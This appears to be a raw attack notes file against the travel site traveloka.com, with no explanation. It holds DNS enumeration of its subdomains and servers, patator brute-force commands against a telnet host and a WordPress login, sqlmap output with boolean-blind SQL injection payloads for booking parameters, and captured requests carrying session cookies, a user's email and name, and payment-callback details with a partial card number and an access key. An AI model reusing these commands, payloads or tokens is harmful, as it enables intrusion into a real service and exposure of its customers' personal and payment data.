@@ -1,0 +1,261 @@
+[+] Getting nameservers
+173.245.58.80 - carol.ns.cloudflare.com
+173.245.59.71 - bart.ns.cloudflare.com
+[-] Zone transfer failed
+
+[+] IPv6 (AAAA) records found. Try running dnscan with the -6 option.
+2400:cb00:2048:1::681f:5f57
+
+2400:cb00:2048:1::681f:5e57
+
+[+] TXT records found
+"google-site-verification=roEtuvOVpHdFTP1gUN7eTfuWZAzXKolku1O7OPqhfuQ"
+"MS=ms18160568"
+"v=spf1 include:sendgrid.net include:smtp.gmail.com include:_spf.google.com include:email-smtp.us-east-1.amazonaws.com ~all"
+"google-site-verification=IHLtgGILsDzHHl4mGIL2A3lNz0Fz6G3jlJJRyptH1to"
+"v=verifydomain MS=1159920"
+"google-site-verification=wgpvpsCVu-mbIiikrQZk0TgTsRhJ5xI4EJRDlM5kMNQ"
+
+[+] MX records found, added to target list
+10 alt1.aspmx.l.google.com.
+20 alt2.aspmx.l.google.com.
+30 aspmx2.googlemail.com.
+40 aspmx3.googlemail.com.
+0 aspmx.l.google.com.
+
+[*] Scanning traveloka.com for A records
+104.31.95.87 - traveloka.com
+104.31.94.87 - traveloka.com
+104.120.243.110 - www.traveloka.com
+97.74.135.111 - pop.traveloka.com
+216.58.211.147 - mail.traveloka.com
+104.120.243.110 - m.traveloka.com
+104.31.94.87 - blog.traveloka.com
+104.31.95.87 - blog.traveloka.com
+68.178.213.203 - smtp.traveloka.com
+104.120.243.110 - api.traveloka.com
+97.74.135.193 - imap.traveloka.com
+52.112.192.139 - sip.traveloka.com
+54.179.66.50 - staging.traveloka.com
+52.112.193.142 - lyncdiscover.traveloka.com
+54.255.232.19 - git.traveloka.com
+52.76.135.177 - git.traveloka.com
+52.76.186.162 - git.traveloka.com
+52.220.27.193 - git.traveloka.com
+167.89.125.30 - mailer.traveloka.com
+54.231.242.163 - s3.traveloka.com
+52.77.23.171 - content.traveloka.com
+52.76.242.162 - content.traveloka.com
+173.201.192.20 - pda.traveloka.com
+104.40.240.50 - msoid.traveloka.com
+104.40.240.48 - msoid.traveloka.com
+104.45.0.25 - msoid.traveloka.com
+104.40.240.49 - msoid.traveloka.com
+104.45.0.26 - msoid.traveloka.com
+104.45.0.17 - msoid.traveloka.com
+104.45.0.24 - msoid.traveloka.com
+104.45.0.18 - msoid.traveloka.com
+54.254.94.59 - tech.traveloka.com
+54.251.254.151 - erp.traveloka.com
+54.251.36.190 - payment.traveloka.com
+104.31.94.87 - press.traveloka.com
+104.31.95.87 - press.traveloka.com
+54.179.16.129 - dashboard.traveloka.com
+54.251.45.151 - bi.traveloka.com
+54.251.44.175 - maintenance.traveloka.com
+122.248.241.146 - maintenance.traveloka.com
+54.251.45.255 - maintenance.traveloka.com
+54.251.44.178 - maintenance.traveloka.com
+173.201.192.148 - mobilemail.traveloka.com
+52.77.65.243 - metrics.traveloka.com
+52.77.42.26 - metrics.traveloka.com
+54.179.247.212 - mp.traveloka.com
+46.137.218.100 - terra.traveloka.com
+104.120.243.110 - asset.traveloka.com
+52.77.186.72 - ssltest.traveloka.com
+202.147.198.227 - vpn01.traveloka.com
+52.77.35.100 - sonar.traveloka.com
+54.251.47.163 - tap.traveloka.com
+54.251.44.247 - tap.traveloka.com
+46.137.218.100 - tera.traveloka.com
+52.76.135.177 - codereview.traveloka.com
+52.220.27.193 - codereview.traveloka.com
+52.76.186.162 - codereview.traveloka.com
+54.255.232.19 - codereview.traveloka.com
+116.254.102.210 - vpn02.traveloka.com
+
+
+
+
+python patator.py telnet_login host=116.254.102.210 port=2323 inputs='FILE0\nFILE1' 0=logins.txt 1=rockyou.txt prompt_re='tux login:|Password:' -x reset:egrep!='Login incorrect.+tux login:'
+
+python patator.py http_fuzz url=https://blog.traveloka.com/wp-login.php method=POST follow=1 accept_cookie=1 body='log=FILE0&pwd=FILE1d&wp-submit=Log+In' 0=login.txt 1=rockyou.txt -x ignore:fgrep='ERROR: The username or password you'
+
+
+
+GET /user/salesorder?orderId=112472633&auth=827ad49183&iid=112472633.N9T14G.0 HTTP/1.1
+Host: www.traveloka.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Cookie: tv-lifetime-0004="BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2ckD/PIVOyCPw4viw120ggyI/uLbysO2NpUaxtFGfg3mhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsFgXdsgCW3pr13gmlh8ICymms7vKtS2h2qeLU3t5NI4n6NovoKG+cPLXF4g7S59dO5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKu/qz8Q5/cXdrA60nX6QqFSECnV3oXYg110aFy4mM3oM7eoc/CACUPawEP9T2upL5Lgo8dJ1Y+i0Sedng5Wdk1iPZ0Q3edlcqscZ0470km8j"; tv-session-0004=/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5Y/8jjA5zt/iLVWcJkz3INXGfINcI9bEfFfvQigbVgQ7; selectedCurrency=IDR; abTestFlightResultPriceWidget=1; flightSearchResultABTreatment=3; hotelAccess=true; G_ENABLED_IDPS=google; __utma=130213834.284085481.1482406030.1482406030.1482459916.2; __utmc=130213834; __utmz=130213834.1482406030.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __zlcmid=eDg5rFnXDtIqoR; tv-user-0004=pSBKDCbpCniepMsb+ia2g2TB+7P4GkQ1O5KBKkNJTmLRkgirF8jtyCM6CDyOX4Me7Cr5cSF72ZkAPzJGK35eS578m9UQYLIPgBs5tZRHzEt6I/mONt9/CjB8mMEeOqCjRM6h0rjOgMPBbGGE2GsyOQ==; tv-secure=1; urls=%2Fuser%2Fsalesorder%3ForderId%3D112472633%26auth%3D827ad49183%26iid%3D112472633.N9...; __utmb=130213834.1.10.1482459916; __utmt=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+POST /user/getFlightBookingInvoice?bookingId=112472633&invoiceId=1552145456718445977&userId=baguzajjja%40gmail.com-tv HTTP/1.1
+Host: www.traveloka.com
+Connection: keep-alive
+Content-Length: 0
+Cache-Control: max-age=0
+Origin: https://www.traveloka.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: https://www.traveloka.com/user/salesorder?orderId=112472633&auth=827ad49183&iid=112472633.N9T14G.0
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8,id;q=0.6
+Cookie: G_ENABLED_IDPS=google; tv-secure=1; __cfduid=db8d963897c27191948a9ff308b0b11901482406007; sourceAirport=JKTA; destinationAirport=DPS; flightDate=12/23/2016; passenger=1.0.0; seatClassType=ECONOMY; tooltipSeatClassCookie=false; __flash={}; _ceg.s=oil8h3; _ceg.u=oil8h3; tvGaLastTrackPageView=/hotel; _ga=GA1.2.558520694.1482303471; __utmt=1; urls=%2Fuser%2FeditProfile,%2F,%2Fhotel%2Fsearch%3Fspec%3D29-12-2016.31-12-2016.2.1.HOTEL_GEO.102746.Bali%25...,%2Fhotel,%2Fnewsletter,%2Fcareers,%2Fcareers%3Futm_source%3Dblog.traveloka.com%26utm_campaign%3Dmenu%26utm_medium...,%2Fbugs,%2Fuser%2FbookingHistory,%2Fuser%2Fsalesorder%3ForderId%3D112472633%26auth%3D827ad49183%26iid%3D112472633.N9...; selectedCurrency=IDR; tv-lifetime-0004="BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2jULLqTlNU9mDTvEgEiV0RFNveImgIePqVrwQe8FSuEmhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsnsIsTjKNNxjco0thTptB0mms7vKtS2h2qeLU3t5NI4k0EPSpAXtsAr/7sbyseSRi0IMMppbM1Pg2nRM+pURiPt7zb8GMjO6A2xTAdvQdlIoWtif41pKNiX7AGe/7MlcFBEO3gWIYerjNE2kHpJCJFwFJWuqOq2/simUH5DyooSQWWGGYDUaVPDOYkoyIxGXRM5FL01z9ZL+HYj0izQwsZtkiOOKrErNJnYtIgqoYpMY/sdG5boKoHBJyE8u1U9ACLtx4MZiBid4f4B+h1kx3k"; abTestFlightResultPriceWidget=1; tv-session-0004="+e5WdVIZKdo8FR3DYlZ0v2m0Bd4KmDO04huQ7JM5azXrb+SV3FUltyjQgd/vbRD1SyF65IxbCrqdk2tl12knRsncL158uoTYQmdBGD+w6nnGfINcI9bEfFfvQigbVgQ7"; flightSearchResultABTreatment=3; hotelAccess=true; __utma=130213834.558520694.1482303471.1482423665.1482459870.7; __utmb=130213834.2.10.1482459870; __utmc=130213834; __utmz=130213834.1482423665.6.5.utmcsr=blog.traveloka.com|utmccn=menu|utmcmd=referral|utmctr=Karir; tv-user-0004=pSBKDCbpCniepMsb+ia2g2TB+7P4GkQ1O5KBKkNJTmLRkgirF8jtyCM6CDyOX4Me7Cr5cSF72ZkAPzJGK35eS578m9UQYLIPgBs5tZRHzEt6I/mONt9/CjB8mMEeOqCjRM6h0rjOgMPBbGGE2GsyOQ==; __zlcmid=eCg5g3kN896yBk
+
+bookingId=112472633&invoiceId=1552145456718445977&userId=baguzajjja%40gmail.com-tv
+
+
+
+
+POST /v1/hotel/book/create HTTP/1.1
+Host: api.traveloka.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.traveloka.com/hotel/booking
+Content-Type: application/json
+Content-Length: 1337
+origin: https://www.traveloka.com
+Connection: keep-alive
+
+{"data":{"contexts":{},"hotelId":"287327","providerId":"T04","checkInDate":"24-12-2016","checkOutDate":"26-12-2016","totalSearchRate":{"currency":"IDR","baseFare":"1962021","fees":"0","taxes":"412024","totalFare":"2374045","numOfDecimalPoint":"0"},"roomSpecs":[{"hotelRoomId":"10307362","guestInfo":{"numAdult":"2","numChildren":"0","numInfant":"0"},"promoIds":null,"context":null}],"preBookingId":"1554472914839961385","backdate":null,"numRooms":"1","guests":[{"firstName":"bagus","passportCountryCode":null,"title":null}],"contact":{"personTitle":null,"firstName":"bagus","email":"asdsa@gmail.com","phone":["+62123123123"]},"specialRequest":"","hasInsurance":"false"},"fields":[],"context":{"tvLifetime":"\"BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2ckD/PIVOyCPw4viw120ggyI/uLbysO2NpUaxtFGfg3mhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsFgXdsgCW3pr13gmlh8ICymms7vKtS2h2qeLU3t5NI4n6NovoKG+cPLXF4g7S59dO5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKketwPWfAvYDSAolPVWU0ibV5zenFduPSZZG/IcMeWZO7eoc/CACUPawEP9T2upL5Lgo8dJ1Y+i0Sedng5Wdk1iPZ0Q3edlcqscZ0470km8j\"","tvSession":"\"/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5YrMJwk5aLZNQA+k2KXpm87GfINcI9bEfFfvQigbVgQ7\""},"clientInterface":"desktop"}
+
+
+
+hotelId,providerId,checkInDate,checkOutDate,,baseFare,taxes,hotelRoomId
+
+
+
+
+POST /v1/user/requestaddlogintoken HTTP/1.1
+Host: api.traveloka.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.traveloka.com/user/editProfile
+Content-Type: application/json
+Content-Length: 726
+origin: https://www.traveloka.com
+Connection: keep-alive
+
+{"data":{"requestId":"1554308105483877442","userLoginMethod":"HP"},"fields":[],"context":{"tvLifetime":"eTq6r7InDN+j0vrg5Bujah9yFLWfBGsNGWxzjTBUa/ikwbvfMgAnBH0xwf6556O9ry9IGV26qTZtAxooltVnHoyMOqRbC+ThjIZghsyVejvoVtP7YAtEQ0u5lggZ080+zgPpjROyK9euO/HjXgppH2nrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsFgXdsgCW3pr13gmlh8ICymms7vKtS2h2qeLU3t5NI4n6NovoKG+cPLXF4g7S59dO5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKsDxTkPq6nJG2mnHraei+Hi27dnhr9mZtkAcXSf+E9u1DCacUPy2n0aUG2J3LYqZC6vQaBYjBkrUGtVTECnuNUWPZ0Q3edlcqscZ0470km8j","tvSession":"/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5YrMJwk5aLZNQA+k2KXpm87GfINcI9bEfFfvQigbVgQ7"},"clientInterface":"mobile"}
+
+
+requestId
+
+log.txt
+
+[03:22:38] [PAYLOAD] -3101%') OR MAKE_SET(1618>1617,4630) AND ('%'='
+[03:22:38] [DEBUG] got HTTP error code: 403 (Forbidden)
+POST parameter 'bookingId' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+sqlmap identified the following injection point(s) with a total of 1734 HTTP(s) requests:
+---
+Parameter: bookingId (POST)
+    Type: boolean-based blind
+    Title: MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)
+    Payload: bookingId=-4254%') OR MAKE_SET(9596=9596,8800) AND ('%'='&invoiceId=1552145456718445977&userId=baguzajjja@gmail.com-tv
+    Vector: OR MAKE_SET([INFERENCE],[RANDNUM])
+---
+
+[03:25:36] [INFO] testing SQLite
+you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in futher requests? [Y/n]
+[03:25:47] [INFO] confirming SQLite
+[03:25:47] [INFO] actively fingerprinting SQLite
+[03:25:47] [INFO] the back-end DBMS is SQLite
+web application technology: Nginx
+back-end DBMS: active fingerprint: SQLite 3
+[03:25:47] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.traveloka.com'
+
+[root@server01 sqlmap]# cat go.txt
+POST /user/getFlightBookingInvoice?bookingId=112472633&invoiceId=1552145456718445977&userId=baguzajjja%40gmail.com-tv HTTP/1.1
+Host: www.traveloka.com
+Connection: keep-alive
+Content-Length: 0
+Cache-Control: max-age=0
+Origin: https://www.traveloka.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: https://www.traveloka.com/user/salesorder?orderId=112472633&auth=827ad49183&iid=112472633.N9T14G.0
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8,id;q=0.6
+Cookie: G_ENABLED_IDPS=google; tv-secure=1; __cfduid=db8d963897c27191948a9ff308b0b11901482406007; sourceAirport=JKTA; destinationAirport=DPS; flightDate=12/23/2016; passenger=1.0.0; seatClassType=ECONOMY; tooltipSeatClassCookie=false; __flash={}; _ceg.s=oil8h3; _ceg.u=oil8h3; tvGaLastTrackPageView=/hotel; _ga=GA1.2.558520694.1482303471; __utmt=1; urls=%2Fuser%2FeditProfile,%2F,%2Fhotel%2Fsearch%3Fspec%3D29-12-2016.31-12-2016.2.1.HOTEL_GEO.102746.Bali%25...,%2Fhotel,%2Fnewsletter,%2Fcareers,%2Fcareers%3Futm_source%3Dblog.traveloka.com%26utm_campaign%3Dmenu%26utm_medium...,%2Fbugs,%2Fuser%2FbookingHistory,%2Fuser%2Fsalesorder%3ForderId%3D112472633%26auth%3D827ad49183%26iid%3D112472633.N9...; selectedCurrency=IDR; tv-lifetime-0004="BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2jULLqTlNU9mDTvEgEiV0RFNveImgIePqVrwQe8FSuEmhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsnsIsTjKNNxjco0thTptB0mms7vKtS2h2qeLU3t5NI4k0EPSpAXtsAr/7sbyseSRi0IMMppbM1Pg2nRM+pURiPt7zb8GMjO6A2xTAdvQdlIoWtif41pKNiX7AGe/7MlcFBEO3gWIYerjNE2kHpJCJFwFJWuqOq2/simUH5DyooSQWWGGYDUaVPDOYkoyIxGXRM5FL01z9ZL+HYj0izQwsZtkiOOKrErNJnYtIgqoYpMY/sdG5boKoHBJyE8u1U9ACLtx4MZiBid4f4B+h1kx3k"; abTestFlightResultPriceWidget=1; tv-session-0004="+e5WdVIZKdo8FR3DYlZ0v2m0Bd4KmDO04huQ7JM5azXrb+SV3FUltyjQgd/vbRD1SyF65IxbCrqdk2tl12knRsncL158uoTYQmdBGD+w6nnGfINcI9bEfFfvQigbVgQ7"; flightSearchResultABTreatment=3; hotelAccess=true; __utma=130213834.558520694.1482303471.1482423665.1482459870.7; __utmb=130213834.2.10.1482459870; __utmc=130213834; __utmz=130213834.1482423665.6.5.utmcsr=blog.traveloka.com|utmccn=menu|utmcmd=referral|utmctr=Karir; tv-user-0004=pSBKDCbpCniepMsb+ia2g2TB+7P4GkQ1O5KBKkNJTmLRkgirF8jtyCM6CDyOX4Me7Cr5cSF72ZkAPzJGK35eS578m9UQYLIPgBs5tZRHzEt6I/mONt9/CjB8mMEeOqCjRM6h0rjOgMPBbGGE2GsyOQ==; __zlcmid=eCg5g3kN896yBk
+
+bookingId=112472633&invoiceId=1552145456718445977&userId=baguzajjja%40gmail.com-tv
+[root@server01 sqlmap]#
+
+
+
+[03:53:47] [INFO] (custom) POST parameter 'JSON requestId' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable
+
+
+
+POST /cybersource/response HTTP/1.1
+Host: payment.traveloka.com
+Connection: keep-alive
+Content-Length: 2668
+Cache-Control: max-age=0
+Origin: https://secureacceptance.cybersource.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: https://secureacceptance.cybersource.com/silent/pay
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.8,id;q=0.6
+Cookie: tv-secure=1; __cfduid=db8d963897c27191948a9ff308b0b11901482406007; sourceAirport=JKTA; destinationAirport=DPS; flightDate=12/23/2016; passenger=1.0.0; seatClassType=ECONOMY; tooltipSeatClassCookie=false; _ceg.s=oil8h3; _ceg.u=oil8h3; tvGaLastTrackPageView=/hotel; _ga=GA1.2.558520694.1482303471; __flash={}; __utmt=1; __utma=130213834.558520694.1482303471.1482461893.1482466929.9; __utmb=130213834.1.10.1482466929; __utmc=130213834; __utmz=130213834.1482423665.6.5.utmcsr=blog.traveloka.com|utmccn=menu|utmcmd=referral|utmctr=Karir; urls=%2Fnewsletter,%2Fcareers,%2Fcareers%3Futm_source%3Dblog.traveloka.com%26utm_campaign%3Dmenu%26utm_medium...,%2Fbugs,%2Fuser%2FbookingHistory,%2Fuser%2Fsalesorder%3ForderId%3D112472633%26auth%3D827ad49183%26iid%3D112472633.N9...,%2Fuser%2FeditProfile,%2Fbugs,%2Fuser%2FeditProfile,%2Fuser%2FtravelokaQuick; selectedCurrency=IDR; __zlcmid=eCg5g3kN896yBk; tv-user-0004=pSBKDCbpCniepMsb+ia2g2TB+7P4GkQ1O5KBKkNJTmLRkgirF8jtyCM6CDyOX4Me7Cr5cSF72ZkAPzJGK35eS578m9UQYLIPgBs5tZRHzEt6I/mONt9/CjB8mMEeOqCjRM6h0rjOgMPBbGGE2GsyOQ==; tv-lifetime-0004=eTq6r7InDN+j0vrg5Bujah9yFLWfBGsNGWxzjTBUa/ikwbvfMgAnBH0xwf6556O9ry9IGV26qTZtAxooltVnHoyMOqRbC+ThjIZghsyVejvoVtP7YAtEQ0u5lggZ080+uL8+p/7UKLISe4gugR65LmnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsMGmj7f3R5CugO4jDUrLNnmms7vKtS2h2qeLU3t5NI4hovsDZaAs0dcBk/pXpFTbG0IMMppbM1Pg2nRM+pURiPt7zb8GMjO6A2xTAdvQdlIoWtif41pKNiX7AGe/7MlcFBEO3gWIYerjNE2kHpJCJF0eT3YzJX4PsUTrgWmdw4wdvdEcSpBhi47YcOC+rFsrpPaBJh0D8PxWFZaxNNIlwX2ixfI31pngMjPFAdlKAW5Y/sdG5boKoHBJyE8u1U9ACLtx4MZiBid4f4B+h1kx3k; tv-session-0004=+e5WdVIZKdo8FR3DYlZ0v2m0Bd4KmDO04huQ7JM5azXrb+SV3FUltyjQgd/vbRD1SyF65IxbCrqdk2tl12knRolNqMW+5Jlo19SLaiiNs+nGfINcI9bEfFfvQigbVgQ7
+
+utf8=%E2%9C%93&req_locale=en&score_score_result=99&decision_case_priority=3&req_bill_to_surname=wibowo&req_card_expiry_date=06-2017&score_rflag=DSCORE&score_card_issuer=SANDIA+AREA+F.C.U.&score_rcode=1&req_payment_method=card&decision_early_return_code=9999999&transaction_id=4824669863196002403629&req_card_type=001&score_factors=B%5EF&score_model_used=travel&req_bill_to_address_country=US&decision_rmsg=Decision+is+REJECT.&req_profile_id=tvlokaa&decision_rcode=0&score_rmsg=Score+exceeds+threshold.+Score+%3D+99&decision_rflag=DREJECT&signed_date_time=2016-12-23T04%3A23%3A07Z&req_bill_to_address_line1=1295+Charleston+Road&req_card_number=446554xxxxxx6498&signature=CHpbR8aXpj3Xsiimwk9o6CMPBEaLNZawn0J0gZ9fQX0%3D&score_card_scheme=VISA+DEBIT&score_bin_country=US&req_bill_to_address_city=Mountain+View&req_bill_to_address_postal_code=94043&score_reason_code=100&reason_code=481&req_bill_to_forename=bagus+ariyanto&request_token=Ahjz7wSTBYu%2BnmFaNMUtSAFRXSiHUCq0AGNVeHSTLdIDto9AS5MFi76eYVo0xS0AGWVE&score_card_account_type=CLASSIC&req_amount=0.00&req_bill_to_email=baguzajjja%40gmail.com&req_currency=IDR&score_hotlist_info=NEG-ASUSP%5ENEG-EM&decision=DECLINE&decision_return_code=1322002&message=Decision+is+REJECT.&signed_field_names=transaction_id%2Cdecision%2Creq_access_key%2Creq_profile_id%2Creq_transaction_uuid%2Creq_transaction_type%2Creq_reference_number%2Creq_amount%2Creq_currency%2Creq_locale%2Creq_payment_method%2Creq_bill_to_forename%2Creq_bill_to_surname%2Creq_bill_to_email%2Creq_bill_to_address_line1%2Creq_bill_to_address_city%2Creq_bill_to_address_state%2Creq_bill_to_address_country%2Creq_bill_to_address_postal_code%2Creq_card_number%2Creq_card_type%2Creq_card_expiry_date%2Cmessage%2Creason_code%2Crequest_token%2Cscore_factors%2Cscore_rcode%2Cscore_time_local%2Cscore_model_used%2Cscore_return_code%2Cscore_host_severity%2Cscore_score_result%2Cscore_reason_code%2Cscore_rflag%2Cscore_rmsg%2Cscore_card_account_type%2Cscore_card_issuer%2Cscore_card_scheme%2Cscore_hotlist_info%2Cscore_internet_info%2Cdecision_early_return_code%2Cdecision_early_reason_code%2Cdecision_reason_code%2Cdecision_rmsg%2Cdecision_rcode%2Cdecision_case_priority%2Cdecision_return_code%2Cdecision_early_rcode%2Cdecision_rflag%2Cscore_bin_country%2Csigned_field_names%2Csigned_date_time&req_transaction_uuid=659919TK&decision_reason_code=481&score_time_local=20%3A23%3A06&score_return_code=1072000&score_host_severity=1&req_transaction_type=authorization%2Ccreate_payment_token&req_access_key=c6921f56c3e137faba0fbb48c0796686&score_internet_info=FREE-EM&decision_early_reason_code=100&req_reference_number=659919TK&req_bill_to_address_state=CA&decision_early_rcode=1
+
+
+
+
+GET /partner/trinusa/bookingReview?auth=75329e3423&fbrid=&iid=1554481465273646699 HTTP/1.1
+Host: www.traveloka.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.traveloka.com/partner/trinusa/booking?token=1554481320575401228
+Cookie: tv-lifetime-0004="BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2ckD/PIVOyCPw4viw120ggyI/uLbysO2NpUaxtFGfg3mhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsFgXdsgCW3pr13gmlh8ICymms7vKtS2h2qeLU3t5NI4n6NovoKG+cPLXF4g7S59dO5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKketwPWfAvYDSAolPVWU0iZ0hKE0HeDbK2x6W9Dodkbx7eoc/CACUPawEP9T2upL5Lgo8dJ1Y+i0Sedng5Wdk1iPZ0Q3edlcqscZ0470km8j"; tv-session-0004=/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5Wmc4V5doy7b/D6Pn6S9DzTGfINcI9bEfFfvQigbVgQ7; selectedCurrency=IDR; abTestFlightResultPriceWidget=1; flightSearchResultABTreatment=3; hotelAccess=true; G_ENABLED_IDPS=google; __utma=130213834.284085481.1482406030.1482459916.1482468752.3; __utmc=130213834; __utmz=130213834.1482406030.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __zlcmid=eDg5rFnXDtIqoR; tv-secure=1; urls=%2Fuser%2FeditProfile,%2Fuser%2FeditProfile,%2Fuser%2FeditProfile,%2Fpromotion,%2Fuser%2FbookingHistory,%2Fconnectivity,%2Fpromotion,%2F%3FdefaultTab%3Dflight,%2Ffullsearch%3Fap%3DJKTA.DPS%26dt%3D24-12-2016.NA%26ps%3D1.0.0%26sc%3DECONOMY,%2Fpartner%2Ftrinusa%2Fbooking%3Ftoken%3D1554481320575401228; tvGaLastTrackPageView=/bookingContact; _ceg.s=oimgad; _ceg.u=oimgad; __utmb=130213834.6.10.1482468752; __utmt_UA-29776811-1=1; __utmt=1; sourceAirport=JKTA; destinationAirport=DPS; flightDate=12/24/2016; passenger=1.0.0; seatClassType=ECONOMY; tooltipSeatClassCookie=false; tv-user-0004=pSBKDCbpCniepMsb+ia2g2TB+7P4GkQ1O5KBKkNJTmLRkgirF8jtyCM6CDyOX4Me7Cr5cSF72ZkAPzJGK35eS578m9UQYLIPgBs5tZRHzEt6I/mONt9/CjB8mMEeOqCjRM6h0rjOgMPBbGGE2GsyOQ==; __flash="{\"_trackTrans\":\"on\",\"_bookingId\":\"118271406\"}"
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+{"data":{"sentTimestamp":1482469024461,"timezoneOffset":25200000,"events":[{"event":"booking.passenger.attemptSubmitPassenger","data":{"action":"submitOrderBtnClicked","airline":"JT","airline0":"JT","airline1":"","bookingToken":"1554481320575401228"},"timestamp":1482469015341}],"currency":"IDR"},"fields":[],"context":{"tvLifetime":"BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2ckD/PIVOyCPw4viw120ggyI/uLbysO2NpUaxtFGfg3mhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsFgXdsgCW3pr13gmlh8ICymms7vKtS2h2qeLU3t5NI4n6NovoKG+cPLXF4g7S59dO5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKketwPWfAvYDSAolPVWU0iabt7bhbxuA4j2BtJILeHEQ7eoc/CACUPawEP9T2upL5Lgo8dJ1Y+i0Sedng5Wdk1i